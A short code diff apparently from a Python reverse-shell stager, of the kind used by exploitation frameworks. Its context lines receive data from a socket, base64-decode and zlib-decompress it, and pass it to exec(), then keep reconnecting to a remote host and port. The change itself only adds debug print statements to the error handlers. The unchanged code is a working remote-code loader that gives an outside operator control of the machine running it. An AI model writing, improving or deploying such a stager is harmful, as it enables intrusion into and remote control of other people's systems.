@@ -17,12 +17,13 @@ try:
     while len(d)<l:
         d+=s.recv(l-len(d))
     exec(zlib.decompress(base64.b64decode(d)),{'s':s})
-except:
+except Exception as e:
+    print("e2", str(e))
     while True:
         try:
             s.connect((host.split(":")[0],int(host.split(":")[1])))
             print("Connected")
             break
         except Exception as e:
-            print(e)
+            print("e3", e)
             time.sleep(5)
